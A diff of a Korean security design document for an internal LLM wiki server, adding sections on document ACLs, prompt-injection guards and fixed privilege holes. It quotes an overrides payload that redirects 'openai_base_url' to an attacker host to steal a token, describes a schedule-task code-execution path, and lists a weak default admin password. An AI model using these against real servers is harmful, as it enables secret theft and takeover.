@@ -2,7 +2,7 @@
 
 > 대상: LLM Wiki 를 사내 서버에 올려 여러 사람과 여러 외부 LLM(MCP)이 쓰게 할 운영자/관리자. "누가 실수로 색인 DB 를 날리는 것"을 막고, 권한이 있는 사람이 **자기가 무엇을 하는지 알고** 실행하게 하는 것이 목표다.
 > 사내 표준인 **아이디/비밀번호 로그인과 SSO 로그인의 병행**을 기본으로 설계했고, 다른 회사/환경으로 옮길 때 코드가 아니라 `security.json` 한 파일만 바꾸면 되게 했다.
-> 2026-09-14: 역할 6단계(viewer·class3·class2·class1·builder·admin), 작업 등급 7단계, **admin 이 편집하는 권한 표(permissions)**, 익명(게스트) 접속, CLI 권한 게이트, API 키(MCP/스크립트) 추가. 설계 배경은 [IMPLEMENTATION_PLAN_0914.md](IMPLEMENTATION_PLAN_0914.md) §1.
+> 2026-09-14: 역할 6단계(viewer·class3·class2·class1·builder·admin), 작업 등급 7단계, **admin 이 편집하는 권한 표(permissions)**, 익명(게스트) 접속, CLI 권한 게이트, API 키(MCP/스크립트) 추가. 설계 배경은 [IMPLEMENTATION_PLAN_0914.md](history/2026-09-14/IMPLEMENTATION_PLAN_0914.md) §1.
 
 ## 0. 요약 (한 장)
 
@@ -19,7 +19,9 @@
 | 감사 | 누가·언제·무엇을·허용/거부 → `logs/audit.jsonl` (Web › Settings › 보안 탭, `security audit`). CLI 게이트 거부도 기록 |
 | CLI | 같은 표로 게이트한다. 실행자 역할 = `--user`/`LLMWIKI_USER`+`LLMWIKI_PASSWORD` 로컬 계정 > `LLMWIKI_API_KEY` > `security.json cli.default_role`(기본 admin). 거부는 종료 코드 5 |
 | 기본 admin | `kh82.kim / 1234qwer` (프로젝트 루트 security.json 에 생성됨). 변경: `users passwd kh82.kim` 또는 Web 보안 탭 |
-| 이식 | `security.json` 하나(+ `.env` 의 OIDC client secret). 표준 라이브러리만 사용 |
+| 문서 접근 제어 | 역할이 **무엇을 읽을 수 있나**는 `docacl.json`(경로 규칙) + 문서 front matter 의 `acl:` 로 정한다. 질의 근거·채널 검색·문서 열람·MCP 네 출구를 모두 막는다 (§6.2). 규칙이 없으면 아무도 막지 않는다 |
+| 프롬프트 인젝션 | 컨텍스트에 들어가는 문서 본문은 구획 흉내 조각을 무력화해 펜스로 감싼다(`llmwiki/ctxguard.py`, 토글 `context_guard`). 내용은 지우지 않고 표시만 바꾼다 |
+| 이식 | `security.json` 하나(+ `.env` 의 OIDC client secret, 문서 등급을 쓰면 `docacl.json`). 표준 라이브러리만 사용 |
 
 ## 1. 왜 "암호 하나"가 아니라 계정·역할·권한 표인가 (검토한 대안)
 
@@ -60,6 +62,9 @@
 | `destructive` | 로그·이력·설정 삭제 | admin | 확인 + 문구 + 비밀번호 + 스냅샷 | `/api/build {purge_logs}`, `/api/maintenance purge_requests`, CLI `config reset`, `users remove` |
 
 - 모르는 새 POST 엔드포인트는 자동으로 `edit` 으로 취급된다(안전한 기본값). 새 기능을 붙일 때 표(`classify_api`/`classify_cli`)에 한 줄 추가하면 권한이 따라온다 — ad-hoc `confirm()` 을 흩뿌리지 않는다.
+- **admin 전용 조회**(GET 인데 read 가 아닌 것): `/api/auth/users` · `/api/audit` · `/api/security` · `/api/apikeys` · `/api/admin/server` · `/api/env` · `/api/docacl` · `/api/query_users`.
+  등급이 `read` 인 경로라도 **응답 안에 admin 전용 값이 섞여 있으면 그 부분만 덜어 낸다.** 지금 그런 곳은 하나다 — `GET /api/opstats` 의 `users` 절(누가 몇 건 질의했나)은 `/api/query_users` 와 같은 기준으로 admin 에게만 나가고, 아닌 사람에게는 `redacted` 에 이유가 담겨 온다(가린 사실 자체는 숨기지 않는다). MCP `wiki_status(full=true)` 도 호출한 API 키의 역할로 같은 판정을 받는다 — [OPS_STATS.md §4.5](OPS_STATS.md).
+  **경로 등급만 보고 끝내면 안 된다**: 같은 값을 주는 다른 경로가 더 엄격하다면 그쪽이 기준이다. 아니면 막아 둔 문을 옆문으로 여는 셈이 된다(2026-09-20 정렬 감사에서 실제로 그랬다).
 - Web 콘솔(`/api/cli`)은 **입력한 argv 를 같은 표로 분류**한다. `build fts` 를 콘솔에 쳐도 화면 버튼과 똑같이 문구·비밀번호를 요구하고, 승인되면 `--yes` 를 붙여 실행된다.
 - MCP 도구는 모두 `read` (색인을 바꾸지 않음). `wiki_propose`/`wiki_feedback`/`wiki_forensic` 은 제안·피드백·진단 기록만 남긴다.
 
@@ -211,6 +216,150 @@ set LLMWIKI_API_KEY=lwk_…                           :: 또는 API 키의 역�
 
 스냅샷: `snapshot list | create --tag t | restore <name> | prune --keep N` (CLI), Web › 보안 탭. 복원 직전에도 자동 스냅샷을 남기므로 복원 자체도 되돌릴 수 있다. 채널 리빌드(`build fts|vector|graph`)는 chunks 를 지우지 않으므로 스냅샷 없이 문구 확인만 한다.
 
+## 6.1 요청 단위 `overrides` 화이트리스트와 500 응답 마스킹 (2026-09-18 — 외부 바인드 기본의 전제)
+
+`web_host` 기본값이 `0.0.0.0` 으로 바뀌면서([BRINGUP_GUIDE.md §3.1](BRINGUP_GUIDE.md)) 다음 두 구멍을 먼저 막았다
+([CODE_REVIEW_0917.md](history/2026-09-17/CODE_REVIEW_0917.md) §0 P0-1 · §2.3 S2, 설계 [IMPLEMENTATION_PLAN_0918.md §2.14](history/2026-09-18/IMPLEMENTATION_PLAN_0918.md)).
+
+**(a) 요청 단위 overrides.** `/api/query`·`/api/eval`·`/api/sweep` 등의 본문 `overrides` 는 예전에 Settings 의 **모든** 필드를 받아들였다.
+읽기 등급(익명 포함)이 `{"overrides": {"openai_base_url": "http://attacker/v1"}}` 를 보내면 서버가 `.env` 의 PAT 를 그 주소로 보냈고,
+`corpus_dirs` 로 임의 폴더를 색인시킬 수도 있었다. 지금은 `llmwiki/web/server.py: _filter_overrides` 가 다음만 통과시킨다.
+
+| 누구 | 허용되는 키 |
+|---|---|
+| 모든 역할 | 토글 전부 · `top_k_*` · `rrf_k` · `graph_hops` · `rerank_candidates` · `rerank_chunk_chars` · `context_*` · `answer_max_tokens` · `debug_level` · `llm_provider` · `llm_model` · `llm_effort` · `answer_effort` · `llm_fallbacks` · `embed_provider/model` · `llm_timeout`/`llm_retries`/`llm_retry_backoff*`/`llm_budget_s` · `answer_mode` · `output_mode` · `query_cache_size` · `llm_graph_budget/min_chars` · `tuning{…}`(요청 단위 튜닝 오버레이) · `<role>_<attr>` 단축 키와 `llm_roles.<role>.{provider, model, effort, timeout_s, retries, backoff*, budget_s, max_tokens, circuit_*, ensemble, *_penalty}` |
+| admin | 위 + 나머지 전부 (`deny` 목록 제외) |
+| 아무도 | `security.json overrides.deny` 에 적은 키 |
+
+URL·헤더·경로·서버 운영 키(`*_base_url`, `openai_extra_headers`, `openai_api_key_header`, `corpus_dirs`, `data_dir`, `wiki_dir`, `*_dir`, `mcp_plugins_dir`, `web_*`, `mcp_*` …)는
+admin 이 **Settings › config.json 에 저장**하는 길만 있다. 금지 키가 섞이면 조용히 버리지 않고 **403 과 키 이름**을 돌려준다("설정이 안 먹는다" 로 보이지 않게).
+
+```jsonc
+// security.json (기본값 그대로 — 조정은 코드 수정 없이 이 파일에서)
+"overrides": {"allow_extra": [], "deny": []}
+```
+
+- `allow_extra`: 누구나 쓰게 추가할 키 (예 `["openai_extra_headers"]` — 권장하지 않음).
+- `deny`: admin 도 요청 단위로는 못 바꾸게 할 키 (예 `["corpus_dirs"]`).
+- 확인: viewer 로 `POST /api/query {"question":"x","overrides":{"openai_base_url":"http://x"}}` → 403. `tools/verify/verify_web.py` 와 `tests/test_overrides_guard.py` 가 검사한다.
+
+**(b) 500 응답.** 예전에는 서버 결함의 스택트레이스(파일 경로·코드 조각)를 모든 사용자에게 돌려주면서 서버 로그에는 남기지 않았다.
+지금은 `_server_error` 가 트레이스를 `logs/error.log` 에 `ref` 와 함께 남기고 클라이언트에는 `{"error", "code": "internal", "ref": "<8자>", "hint": "logs grep --text <ref>"}` 만 준다.
+트레이스를 응답에 포함하는 경우는 둘 — 요청자가 admin 이거나 `server.json debug.expose_trace = true`(기본 false, 개발 PC 용).
+
+```jsonc
+// server.json (기본값)
+"debug": {"expose_trace": false}
+```
+
+운영자는 사용자가 알려 준 `ref` 로 `python -m llmwiki logs grep --text <ref> --file error` 를 실행해 원인을 본다.
+
+## 6.2 문서 단위 접근 제어 — 누가 **어떤 문서를 근거로** 볼 수 있나 (2026-09-19)
+
+> 파일 `docacl.json` (원본 [`setup/docacl.example.json`](../setup/docacl.example.json)) · 토글 `doc_acl` · 구현 `llmwiki/docacl.py` · 테스트 `tests/test_doc_acl.py` (24항목)
+
+### 왜 필요한가
+
+§2 의 역할은 지금까지 **무엇을 실행할 수 있는가**만 정했다. 질의를 낼 수 있는지, 빌드를 돌릴 수 있는지.
+그런데 **무엇을 읽을 수 있는가**는 아무도 정하지 않았다. 2026-09-19 이전에는 검색 경로에 신분이 전달조차
+되지 않아서(`_do_query()` 가 사용자 정보를 티켓·로그에만 썼다), 색인된 문서가 하나라도 있으면
+익명 viewer 도 그 내용을 근거로 받아 볼 수 있었다.
+
+사내 위키에는 등급이 다른 문서가 섞인다 — 인사·보안 사고·미공개 로드맵·고객사 이름.
+**RAG 에서 검색은 곧 읽기다.** 색인에 들어간 순간 누구의 질문에도 인용될 수 있으므로,
+읽기 권한을 문서 단위로 나눌 수 있어야 한다.
+
+### 어떻게 정하나 — 두 곳, 높은 쪽이 이긴다
+
+| 출처 | 적는 곳 | 예 | 성격 |
+|---|---|---|---|
+| 문서 자신 | 마크다운 front matter | `acl: class1` · `acl: [class1, admin]` | 정확하지만 빠뜨리기 쉽다 |
+| 경로 규칙 | `docacl.json` 의 `rules[]` | `{"prefix": "corpus/hr/", "min_role": "class1"}` | 폴더째 · 새 문서에도 바로 걸린다 |
+
+둘 다 걸리면 **더 높은 등급**을 요구한다(안전한 쪽). 목록(`[class1, admin]`)을 쓰면 그중 **가장 낮은 역할**이 하한이다.
+아무것도 안 걸리면 `default_min_role`(기본 `viewer` = 모두 공개). `default_min_role` 을 올리면
+"규칙에 적힌 것만 공개"인 화이트리스트 방식이 된다. **admin 은 운영·감사를 위해 항상 전부 본다.**
+
+역할 순서는 §2.1 과 같다: `viewer < class3 < class2 < class1 < builder < admin`.
+front matter 의 역할 이름에 오타가 있으면 값이 무시되어 문서가 공개로 남으므로, 빌드 린트가 `acl` 필드 오류로 알려 준다.
+
+### 어디서 막나 — 한 군데가 아니라 모든 출구
+
+하나만 막으면 나머지로 샌다. 네 창구가 **같은 판정기**(`docacl.Filter`)를 쓴다.
+
+| 출구 | 막는 자리 | 관측 |
+|---|---|---|
+| 질의 답변의 근거 | `query_engine` 의 **`doc_acl` 단계**(부스트 직후·리랭크 직전) | trace 의 `doc_acl` 노드 (`blocked_docs`, `needs`, `removed`) |
+| 채널 검색 디버그 | `retrieval.channel_search` (채널별 원본 목록에서 먼저 제거 — snippet 으로 본문이 새지 않게) | 응답의 `acl` · `counts.acl_blocked` |
+| 문서 열람 | `/api/doc`·`/api/doc_chunks`·`/api/chunk`, MCP `wiki_doc` | 403 + `min_role` |
+| 목록 누설 | `querydebug.doc_detail` 의 후보 목록(`alternatives`), MCP `wiki_related` | 조용히 제외 |
+
+`doc_acl` 단계를 **리랭크 앞**에 둔 이유: 융합·부스트 통계는 원래 후보 기준으로 남겨 "무엇이 걸러졌나"를
+볼 수 있게 하고, 리랭크·컨텍스트·답변·인용 등 뒤쪽 출구가 전부 이 아래에 오도록 하기 위해서다.
+
+신분은 `Pipeline.request_scope(actor={"user","role","origin"})` 로 전달된다. Web·MCP 가 모두 이걸로 감싸고,
+CLI·스케줄러·내부 호출은 `actor` 를 주지 않아 `admin` 으로 동작한다(로컬 운영자 도구).
+
+### 무엇을 하지 않나
+
+- **암호화하지 않는다.** DB 파일을 직접 여는 사람은 다 본다. 이것은 애플리케이션 계층의 접근 제어다.
+- **기본값은 아무도 막지 않음**이다. 규칙을 적지 않으면 예전과 똑같이 동작한다.
+- **그래프 엔티티 이름은 가리지 않는다.** 엔티티·관계는 문서 본문이 아니라 추출된 이름이라 별도 축이다
+  (완전히 가리려면 해당 문서를 색인에서 빼는 편이 맞다).
+- **admin 을 막을 수는 없다.**
+
+### 실패하면 어느 쪽으로 기우나
+
+접근 제어에서 "예외 하나에 열려 버리는" 길은 두지 않았다. 판정 중 오류가 나면 `chunk_id` 만으로
+보수적으로 다시 거르고(`doc_acl` 단계), 문서 열람은 **막는다**. 단, 규칙이 하나도 없으면 애초에 판정기가
+꺼지므로(`enabled=False`) 오류 경로 자체가 없다.
+
+### 다루는 법 (세 창구)
+
+```bash
+python -m llmwiki security docacl init                     # docacl.json 생성
+python -m llmwiki security docacl show                     # 규칙·기본 등급·토글 상태
+python -m llmwiki security docacl check --role viewer      # 지금 색인에 대 보고 몇 건이 가려지는지 (저장 전 영향 확인)
+python -m llmwiki security docacl check --role class2 --json
+```
+
+- **Web**: Settings › 보안 › **문서 접근 제어**. 규칙 추가/삭제·기본 등급·사용 여부를 편집하고,
+  **영향 확인** 버튼이 역할별 "보임/가려짐" 건수와 가려지는 문서 예를 보여 준다.
+- **API**: `GET /api/docacl`(admin) · `POST /api/docacl {action:"check"|"save"}`(admin).
+- **MCP**: 규칙 **편집**은 노출하지 않는다(admin 전용 설정). 그러나 MCP 도구(`wiki_query`·`wiki_search`·`wiki_doc`·`wiki_related`)는
+  API 키의 역할로 **적용을 받는다** — 키 하나로 전 문서가 열리지 않는다.
+
+### 긴급 해제
+
+`config.json` 토글 `doc_acl: false` (Settings › 토글 › ⑧ 보안) 하나로 규칙 전체가 무시된다.
+`docacl.json` 의 `enabled: false` 도 같은 효과다.
+
+## 6.3 창구마다 다른 문이 되지 않게 (2026-09-19 2차 점검)
+
+§6.1 의 overrides 화이트리스트와 §6.2 의 문서 접근 제어는 처음에 **Web 창구에만** 걸려 있었다.
+같은 일을 하는 다른 길이 남아 있으면 자물쇠는 장식이 된다. 2차 점검에서 그 길들을 전부 같은 함수로 모았다.
+
+| 보호 | 어디에 살아야 하나 | 지금 |
+|---|---|---|
+| overrides 화이트리스트 | 창구가 아니라 **auth 계층** | `auth.filter_overrides(ov, role, cfg)` — Web(`_filter_overrides`)과 MCP(`mcp.safe_overrides`)가 같은 함수를 부른다. MCP 는 호출자 역할(`pipe.actor`)로 거르고, stdio(로컬 운영자)는 admin 이라 예전과 같다 |
+| 문서 접근 제어 신분 | 질의를 **실행하는 모든 길** | `/api/query` · `/api/debug/query` · `/api/search` · `/api/query/rerun` · 잡(eval·sweep·precompute) · `/api/cli` 콘솔 · `/mcp` — 일곱 자리 |
+| 재생 경로 | 저장된 컨텍스트에도 | `query_engine._replay_retrieval` 에 `doc_acl` 단계. 근거가 빠지면 저장본을 쓰지 않고 **다시 조립**한다 |
+| 캐시 | 키에 **가시성 등급** | `Pipeline.visibility_key()` 가 `_cache_key`·`answer_signature` 에 들어간다. 캐시가 맞으면 `doc_acl` 은 실행되지 않으므로 키에 없으면 접근 제어가 캐시 하나로 무너진다. 사용자별이 아니라 **역할별**로 나눈다(적중률 유지) |
+| 지난 요청 열람 | 다섯 경로 모두 | `_not_my_request()` — `/api/request` · `/api/rerun` · `/api/query/rerun` · `/api/query_trace` · `/api/analysis`. `request_id` 는 순차 정수라 **열거**가 가능하다 |
+
+### CLI 등급표의 기본값 — 모르는 명령은 admin
+
+`classify_cli` 의 fallback 이 `edit`(class2)이었고 `schedule` 이 어느 표에도 없었다. `POST /api/schedule` 은
+admin 인데, **Web 콘솔**(`/api/cli`)이 이 표를 쓰고 `run_captured` 가 `gate=False` 로 실행하므로
+`schedule add --task '{…"action":{"type":"python"…}}'` 한 번으로 class2 가 서버 프로세스 권한 임의 실행에 이르렀다.
+
+지금은 표에 없는 명령이 **admin** 으로 떨어진다. 새 CLI 명령을 추가하면 `auth.py` 의 등급표에 적어야 하고,
+적지 않으면 admin 만 쓸 수 있다 — 조용히 낮은 등급으로 열리는 것보다 낫다.
+개별 조정은 코드가 아니라 `security perms set 'cli:<명령> <액션>=<역할>'` 로 한다.
+
+고정: `tests/test_privilege_paths.py`(20항목) — 함수가 아니라 **경로**를 센다.
+상세와 남은 항목: [QA_HARDENING_0919.md §9](history/2026-09-19/QA_HARDENING_0919.md) · [CODEBASE_REVIEW_0919.md](history/2026-09-19/CODEBASE_REVIEW_0919.md).
+
 ## 7. 감사 로그
 
 `logs/audit.jsonl` 한 줄 = `{time, user, role, via(local|sso|apikey|anon|cli|off), ip, op, level, ok, detail, error}`. 기록 대상: 로그인/로그아웃(성공·실패), `read` 를 제외한 모든 작업(성공), 모든 거부(401/403, CLI 게이트, MCP 인증 실패). 비밀번호·시크릿·토큰 값은 `***` 로 가린다. 보기: `python -m llmwiki security audit --n 100`, Web › Settings › 보안 탭, `GET /api/audit`(admin).
@@ -222,7 +371,8 @@ set LLMWIKI_API_KEY=lwk_…                           :: 또는 API 키의 역�
 3. SSO 를 쓰면 §4.2/4.3 항목을 채우고 `.env` 에 `LLMWIKI_OIDC_CLIENT_SECRET=`. 그룹 → 역할은 `role_map`.
 4. 권한 표 조정(선택): `security perms set …` 또는 Web 보안 탭. 예) eval 을 viewer 에게 열기 `run=viewer`.
 5. MCP 로 외부 LLM 을 붙이면 `apikey add <이름> --role viewer` 로 키를 발급해 준다 ([MCP.md](MCP.md)).
-6. `python -m llmwiki serve --host 0.0.0.0 --port 8765` — 사용자·API 키·SSO 가 없고 익명도 꺼져 있으면 서버가 **기동을 거부**한다(`--insecure` 로 강제 가능하나 권장하지 않음).
+5.1. 등급이 다른 문서가 섞여 있으면 **문서 접근 제어**를 켠다(§6.2): `setup/docacl.example.json` 을 `docacl.json` 으로 복사해 `rules` 를 채우고, **저장 전에** `security docacl check --role viewer` 로 몇 건이 가려지는지 확인한다. 규칙을 비워 두면 아무도 막지 않으므로 지금 정하지 않아도 나중에 켤 수 있다.
+6. `python -m llmwiki serve` — 2026-09-18 부터 `config.json web_host` 기본값이 **`0.0.0.0`** 이라 플래그 없이도 외부에서 접속된다(`security.mode=auto` 는 비-루프백 바인드에서 로그인을 켠다). 사용자·API 키·SSO 가 없고 익명도 꺼져 있으면 서버가 **기동을 거부**한다(`--insecure` 로 강제 가능하나 권장하지 않음). 이 PC 에서만 쓰려면 `config set web_host=127.0.0.1`. 요청 단위 overrides 화이트리스트와 500 마스킹(§6.1)은 기본으로 켜져 있다.
 7. HTTPS: 서버는 HTTP 만 말하므로 **리버스 프록시(nginx/IIS/사내 게이트웨이)** 뒤에 두고 TLS 종료 + `X-Forwarded-Proto: https` 를 넘기면 쿠키에 Secure 가 붙는다. 프록시에서 IP 별 rate limit 을 걸면 로그인 무차별 대입도 막힌다.
 8. 확인: `security show`, `security perms`; 다른 브라우저에서 게스트로 질의가 되는지, viewer 계정이 빌드 버튼에서 403/로그인 안내를 받는지, builder 가 채널 리빌드에서 문구 모달을 보는지, `security audit` 에 남는지.
 9. 운영: 퇴사/이동은 `users remove` / `apikey remove` 또는 IdP 그룹 정리. 정책 변경은 `security.json` 수정 후 Web 보안 탭 "다시 읽기"(또는 서버 재시작).
@@ -258,7 +408,13 @@ set LLMWIKI_API_KEY=lwk_…                           :: 또는 API 키의 역�
 | `llmwiki/web/static/login.html` | 로그인 화면(ID/PW + SSO 버튼 + 게스트 링크) |
 | `llmwiki/web/static/js/core.js` | `api()` 의 401/403/428 처리(게스트 안내 포함), 단계 확인 모달(`stepUp`), 헤더 사용자/게스트 배지 |
 | `llmwiki/web/static/js/settings.js` | 보안 탭: 역할 설명·사용자·권한 표·API 키·스냅샷·감사 로그 |
-| `llmwiki/cli.py` | `--user/--password` 전역 옵션, `_cli_gate`, `users`, `security show|init|audit|perms`, `apikey`, `snapshot`, 파괴적/리빌드 명령의 확인 문구/`--yes` |
+| `llmwiki/docacl.py` | 문서 단위 접근 제어(§6.2): 규칙 로딩·`min_role_for`(경로 규칙 vs front matter 중 높은 쪽)·`can_see`·요청 단위 `Filter`(문서당 1회 판정 캐시)·`describe`/`check`(영향 미리보기) |
+| `llmwiki/ctxguard.py` | 프롬프트 인젝션 방어: 컨텍스트 본문의 구획·역할·인용 흉내 조각 무력화, 펜스(`<<<C1>>>`) 조립, `injection_marks` 관측 |
+| `llmwiki/mcp.py` | `safe_overrides()` — 도구 인자의 overrides 를 호출자 역할로 거른다(§6.3). `/mcp` 핸들러가 넘긴 `actor` 로 `wiki_query`·`wiki_search`·`wiki_doc`·`wiki_related` 가 문서 접근 제어를 받는다 |
+| `llmwiki/cli.py` | `--user/--password` 전역 옵션, `_cli_gate`, `users`, `security show|init|audit|perms|docacl`, `apikey`, `snapshot`, 파괴적/리빌드 명령의 확인 문구/`--yes` |
 | `llmwiki/pipeline.py` | `reset_index` 락 + 자동 스냅샷 |
+| `tests/test_privilege_paths.py` | **경로** 20항목(§6.3): overrides 위험 키가 모든 역할에서 거부되는가 · Web·MCP 가 같은 필터를 부르는가 · CLI 서브커맨드가 전부 등급표에 있는가(빠지면 admin) · 질의를 실행하는 길이 전부 신분을 받는가 · 재생 경로의 `doc_acl` · 캐시 구획 |
+| `tests/test_doc_acl.py` | 문서 접근 제어 24항목: 규칙 해석(경로 vs front matter, 목록, 오타, 화이트리스트 모드, Windows 경로) · `Filter` 캐시·보고 · 네 출구(답변 근거·채널 검색·문서 열람·후보 목록) · **MCP 도구(`wiki_search`·`wiki_doc`·`wiki_related`)가 호출자 역할을 받는가** · 대조군(admin 은 같은 질의에서 찾는다) · 영향 미리보기 · 토글 해제 |
+| `tests/test_prompt_injection.py` | 인젝션 방어 15항목: 공격 코퍼스 12종(지시 탈취·구획 위조·인용 위조) 무력화 · 본문 보존 · 시스템 프롬프트의 데이터/지시 경계 규칙 · 관측 가능성 |
 | `tests/test_auth.py` | 분류표(7등급) · 해시/서명 · 역할/확인/문구/재인증 · permissions 오버라이드 · 익명 · API 키 · 헤더 SSO · OIDC(가짜 IdP) · Web 통합(로그인→428→승인→스냅샷→감사→권한 표 편집→API 키 질의) · CLI 게이트(viewer 거부, --user 승격, perms/apikey CLI) |
 | `tests/test_features_0914.py` (McpHttpTest) | MCP HTTP 의 Bearer/쿠키/익명 인증, 감사 로그 |
